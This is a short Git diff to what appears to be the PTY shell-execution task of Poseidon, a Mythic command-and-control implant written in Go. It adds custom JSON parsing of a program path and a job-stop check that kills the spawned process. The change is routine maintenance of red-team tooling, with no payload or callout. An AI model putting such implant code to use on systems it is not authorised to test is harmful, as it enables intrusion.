@@ -17,14 +17,26 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
-type Args struct {
-	ProgramPath string `json:"program_path"`
+type Arguments struct {
+	ProgramPath string
+}
+
+func (e *Arguments) UnmarshalJSON(data []byte) error {
+	alias := map[string]interface{}{}
+	err := json.Unmarshal(data, &alias)
+	if err != nil {
+		return err
+	}
+	if v, ok := alias["program_path"]; ok {
+		e.ProgramPath = v.(string)
+	}
+	return nil
 }
 
 // Run - Function that executes the shell command
 func Run(task structs.Task) {
 	msg := task.NewResponse()
-	args := Args{}
+	args := Arguments{}
 	err := json.Unmarshal([]byte(task.Params), &args)
 	if err != nil {
 		msg.SetError(err.Error())
@@ -201,7 +213,11 @@ func Run(task structs.Task) {
 					}
 					bufferedError = ""
 				}
-
+				if task.Job.Stop != nil && *task.Job.Stop == 1 {
+					StdinStdoutPTY.Close()
+					command.Process.Kill()
+					return
+				}
 			}
 		}
 	}()
